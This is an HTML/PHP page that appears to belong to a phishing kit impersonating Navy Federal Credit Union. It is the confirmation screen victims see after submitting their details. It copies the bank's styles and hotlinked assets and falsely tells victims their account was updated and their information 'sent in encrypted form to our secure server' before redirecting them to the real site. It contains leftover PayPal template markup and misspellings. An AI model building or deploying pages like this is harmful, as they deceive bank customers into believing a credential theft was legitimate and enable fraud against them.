<!--?
include('session.php');
?--><!-- Template filename: LogonForm.html 65 -->
<p>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
</p>
<p>
	<title></title>
	<script src="https://www.navyfederal.org/js/jquery-1.4.2.min.js" type="text/javascript"></script><script type="text/javascript" src="https://www.navyfederal.org/js/jquery-ui-1.8.4.custom.min.js"></script><script type="text/javascript" src="https://www.navyfederal.org/js/facebox.js"></script><script language="javascript" type="text/javascript" src="https://www.navyfederal.org/js/jquery.pngFix.js"></script></p>
<p>
	<link href="https://www.navyfederal.org/css/main.css" media="screen" rel="stylesheet" type="text/css" />
</p>
<p>
	<link href="https://www.navyfederal.org/css/facebox.css" media="screen" rel="stylesheet" type="text/css" />
	<script type="text/javascript"><!--
	
 	$(document).ready(function(){
	$(document).pngFix();
 });
 	
jQuery(document).ready(function($) {
$('a[rel*=facebox]').facebox(); 
});
 
 
 
function win(i)  {
	mapWindow = window.open(i,'main_frames', 'toolbar=yes,location=no,directories=no,status=no,menubar=yes,scrollbars=yes,resizable=yes,width=700,height=600,left=20,top=10');
	mapWindow.focus();
}
function selfinit() { document.formLogon.comboLogonNumber.focus(); }
function autoTab(input,len,e) {
        var keyCode = e.keyCode;
        var filter = [0,8,9,16,17,18,37,38,39,40,46];
        if (input.value.length >= len && !containsElement(filter,keyCode)) {
                input.value = input.value.slice(0, len);
                input.form[(getIndex(input)+1) % input.form.length].focus();
        }
        function containsElement(arr, ele) {
                var found = false, index = 0;
                while(!found && index < arr.length)
                        if(arr[index] == ele) found = true;
                        else index++;
                return found;
        }
        function getIndex(input) {
                var index = -1, i = 0, found = false;
                while (i < input.form.length && index == -1)
                        if (input.form[i] == input) index = i;
                        else i++;
                return index;
        }
        return true;
}
function checkNumber(checkString) {
    newString = "";
    count = 0;
    for (i = 0; i < checkString.length; i++) {
        ch = checkString.substring(i, i+1);
        if ((ch >= "0" && ch <= "9")) {
            newString += ch;
        }
    }
    if (checkString != newString) {
       alert("Invalid characters entered, please use \nnumbers only\(0-9\)");
	   document.formLogon.comboLogonNumber.focus();
	   return newString;
	}
    return checkString;
}
function createWindow(cUrl,cName,cFeatures) {
  var xWin = window.open(cUrl,cName,cFeatures);
}

//var _gaq = _gaq || [];
//_gaq.push(
 //   ['_setAccount', 'UA-7359596-1'],
//    ['_setDomainName', current_top_domain()],
//    ['_setAllowHash', false],
//    ['_setAllowLinker', true],
//    ['_trackPageview']
//);
// --></script>
	<style type="text/css">
body {
	margin: 0 auto;
	font: normal 12px arial;
	color: #464646;
	background: #fff url("https://www.navyfederal.org/images/cloud_bg.jpg") no-repeat center top;
}
#pagebox {
	position: relative;
	margin: 0 auto;
	width: 964px;
}

 

#footer-legal .sot  {
	background:url(https://www.navyfederal.org/images/icons/ico-sot.gif) no-repeat right 0;
}
#footer-legal .ncua  {
	background:url(https://www.navyfederal.org/images/icons/ico-ncua.gif) no-repeat 0 0;
}

#footer-legal .ehl  {
	background:url(https://www.navyfederal.org/images/icons/ico-ehl.gif) no-repeat 0 0;
}

 

 


#logo {
  left:0px;
  position:relative;
  top:30px;
}
#logo, #logo a {
  display:block;
  height:60px;
  width:136px;
}
#logo a {
  background: url("") no-repeat scroll 0 0;
  overflow:hidden;
  text-align:left;
  text-indent:-9999px;
  cursor:pointer;
}
#dod_hdr {
	position: relative;
	top: -30px;
	left: 142px;
}
#dod_hdr, #dod_hdr a {
	display:block;
  width: 354px;
	height: 60px;
}
#dod_hdr {
	background: url("");
	overflow:hidden;
  text-align:left;
  text-indent:-9999px;
  cursor:pointer;
}
#top_nav {
	position: absolute;
	top: 28px;
	left:610px;
	color: #fff;
}
#top_nav a:link, #top_nav a:visited {
	font: normal 12px arial;
	color: #fff;
	text-decoration: none;
}
#top_nav a:hover {
	text-decoration: underline;
}
#search {
	position: absolute;
	top: 60px;
	left: 670px;
	width:240px; 
	height:25px; 
	text-align:right;
	z-index:1;
}
#searchform {
	width: 265px;
	height: 25px;
}
.searchform {
	float: left;
	font:normal 11px arial, verdana,sans-serif; 
	background-color:#fff;
	border: none;
	padding:2px;
	width: 190px;
	height: 21px;
}
.searchbtn { 
	font: bold 12px arial, verdana,sans-serif; 
	color:#fff; 
	background: #f58021;
	border: none;
	width: 66px;
	height: 25px;
}
#message {
	margin:10px 0 20px 50px;
	background: url(https://www.navyfederal.org/images/aa_login_mssg_bg.gif);
	width: 848px;
	height: 69px;
}
#aa_header {
	font: normal 12px arial;
	width: 400px;
	height:35px;
	border-left: solid 1px #666;
	border-right: solid 1px #999;
	border-bottom: solid 1px #999;
}
#aa_header thead tr th {
background:url("https://www.navyfederal.org/images/bg-th.png") repeat-x scroll 0 0 transparent;
	font: bold 12px arial;
	padding: 4px;
	text-align: left;
}
#aa_header td {
	font: normal 12px arial;
	padding: 4px 2px 4px 4px;
}
.arrow2 {
	background: url("https://www.navyfederal.org/images/bluearrow.png") 0 10px no-repeat;
	padding-left:15px;
}

.instBox { background-color: rgb(255,255,217); border: 1px solid red; padding: 0.5em; margin-top: 1em; }
.exclamation { background-color: red; color: yellow; font-size: 32px; text-align: center; border: 1px solid black; padding: .15em .2em; }
.instText { padding-left: 1em; font-size: 10pt; vertical-align: middle; }

#formLogon { background-color: #fff; padding: 0.5em 1em 5px 1em; }
#formLogon label { font:bold 11px Arial, sans-serif; color:#300; margin-left: 1px; }
#formLogon input { border: 1px solid #ccc; }
#formLogon input#inComboLogonNumber { color: #000; background-color: #fff; margin-bottom: 0.3em; padding: 1px 0.3em; width: 14em; }
#formLogon input#inUserid { color: #000; background-color: #fff; margin-bottom: 0.3em; padding: 1px 0.3em; width: 14em; }
#formLogon input#inPasswrd {color: #000; background-color: #fff; margin-bottom: 0.3em; padding: 1px 0.3em; width: 14em; }
#formLogon input#inSubmit { color: #fff; background-color: #f90; margin-top: 0.2em; border: 1px outset #f90; padding: 2px 0.2em; font-weight: bold; font-size: 75%; width: auto; }
#formLogon input#inSubmit:hover { color: #000; background-color: #ffc; }	</style>
</p>
<div id="pagebox">
	<div id="logo">
		<a href="https://www.navyfederal.org/index.php">Navy Federal Credit Union</a></div>
	<div id="dod_hdr">
		<a href="https://www.navyfederal.org/membership-benefits/military-exclusives.php">We Serve Where You Serve</a></div>
	<div style="width:960px;background:#fff;margin-top:-24px;padding-top:20px;">
		<div style="margin-left:50px;">
			<h1>
				&nbsp;</h1>
			<div style="float:left;;width:400px;">
				<table border="0" cellpadding="0" cellspacing="0" id="aa_header">
					<thead>
						<tr style="color:#fff;">
							<th height="35" width="400">
								<div style="margin-left:15px; margin-top:2px;">
									Thank You</div>
							</th>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td height="200" style="padding-left:20px;">
								<div style="margin-top:20px;">
									<table align="center" border="0" cellpadding="0" cellspacing="0" style="color: rgb(0, 0, 0); font-family: Arial, Helvetica, sans-serif;" width="600">
										<tbody>
											<tr>
												<td class="notificationBg style1" style="background-color: rgb(239, 247, 254);" width="100%">
													<div align="center" class="style1">
														You have successfully Update your account</div>
												</td>
												<td class="ppsmalltext" nowrap="nowrap">
													&nbsp;</td>
												<td>
													&nbsp;</td>
											</tr>
											<tr>
												<td colspan="3">
													<img height="2" src="http://www.paypal.com/images/pixel.gif" width="2" /></td>
											</tr>
										</tbody>
									</table>
									<table align="center" border="0" cellpadding="0" cellspacing="0" style="color: rgb(0, 0, 0); font-family: Arial, Helvetica, sans-serif;" width="600">
										<tbody>
											<tr bgcolor="#336699">
											</tr>
										</tbody>
									</table>
									<p align="center" style="color: rgb(0, 0, 0); font-size: 12px; line-height: normal;">
										&nbsp;</p>
									<p align="center" style="color: rgb(0, 0, 0); font-size: 12px; line-height: normal;">
										&nbsp;</p>
									<table align="center" border="0" cellspacing="1" class="headerBorder" style="padding: 5px; background-color: rgb(249, 249, 249); font-size: 0.91em; color: rgb(0, 0, 0); font-family: Arial, Helvetica, sans-serif;" width="637">
										<tbody>
											<tr>
												<td width="629">
													<div align="center">
														All information had been sent in encrypted form to our secure server.&nbsp;<br />
														Thank you for a using Navy Fedral!&nbsp;<br />
														You will be redirected to the products-services page. if not please click&nbsp;<a href="https://www.navyfederal.org/products-services/investments-insurance/events.php" style="color: rgb(8, 68, 130); text-decoration: underline;">here</a>&nbsp;&nbsp;</div>
												</td>
											</tr>
										</tbody>
									</table>
									<ul class="pLinks" style="margin-left:100px;line-height:30px;list-style:none;">
									</ul>
								</div>
							</td>
						</tr>
					</tbody>
				</table>
			</div>
			<div style="clear:both;margin-bottom:20px;">
				&nbsp;</div>
		</div>
	</div>
	<!--Begin Top Nav/Search-->
	<div id="top_nav">
		<span style="margin-right:5px;"><a href="https://www.navyfederal.org/index.php">Home</a></span>|<span style="margin: 0 5px 0 5px;"><a href="https://www.navyfederal.org/about/about.php">About Us</a></span>|<span style="margin: 0 5px 0 5px;"><a href="https://www.navyfederal.org/contact-us.php">Contact Us</a></span>|<span style="margin: 0 5px 0 5px;"><a href="https://www.navyfederal.org/branches-atms/index.php">Branches &amp; ATMs</a></span>|<span style="margin: 0 5px 0 5px;"><a href="https://www.navyfederal.org/about/what-you-need-to-apply.php">Join Now</a></span></div>
	<div id="search">
		<form action="http://search.navyfederal.org/search" id="searchform" method="get" name="gs" target="_self">
			<input name="entqr" type="hidden" value="0" /> <input name="output" type="hidden" value="xml_no_dtd" /> <input name="sort" type="hidden" value="date:D:L:d1" /> <input name="client" type="hidden" value="nfcu_results" /> <input name="ud" type="hidden" value="1" /> <input name="oe" type="hidden" value="UTF-8" /> <input name="ie" type="hidden" value="UTF-8" /> <input name="proxystylesheet" type="hidden" value="nfcu_results" /> <input name="proxyreload" type="hidden" value="1" /> <input name="site" type="hidden" value="navyfederal" /> <input class="searchform" id="txt_words" name="q" onfocus="this.value='';" size="18" type="text" /> <input class="searchbtn" name="submit" onfocus="if(this.blur)this.blur()" type="submit" value="Search" vspace="3" />&nbsp;</form>
	</div>
</div>
<div id="footer">
	<br />
	<div id="footer-legal">
		<p>
			<span class="ehl">Equal Housing Lender</span> | View our <a href="https://www.navyfederal.org/pdf/publications/NFCU_198_PrivacyPolicy.pdf">Privacy Policy</a> <span class="sot">|</span></p>
		<p>
			<span class="ncua">Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government <a href="https://www.navyfederal.org/pdf/ebrochures/1116e.pdf">More information</a></span></p>
		<p>
			National Credit Union Administration, a U.S. Government Agency | View <a href="#browserRequirements" rel="facebox">Browser Information</a></p>
		<p>
			<a href="#patriot" rel="facebox">Important Information About Opening a New Account</a> | *APY = Annual Percentage Yield. APR = Annual Percentage Rate.</p>
	</div>
	<div id="patriot" style="display:none;">
		<h1>
			USA PATRIOT Act Information</h1>
		<p>
			To help fight the funding of terrorism and money laundering activities, Federal law requires all financial institutions to obtain, verify and record information that identifies each person who opens an account, including joint owners.</p>
		<h3>
			What This Means For You</h3>
		<p>
			When you open an account, we will ask you for your name, address, date of birth and other information that will allow us to identify you.</p>
	</div>
	<div id="browserRequirements" style="display:none;">
		<iframe frameborder="0" height="530" marginheight="0" marginwidth="0" scrolling="no" src="https://www.navyfederal.org/browser-requirements.html" width="600"></iframe></div>
</div>
<!--End Footer Content-->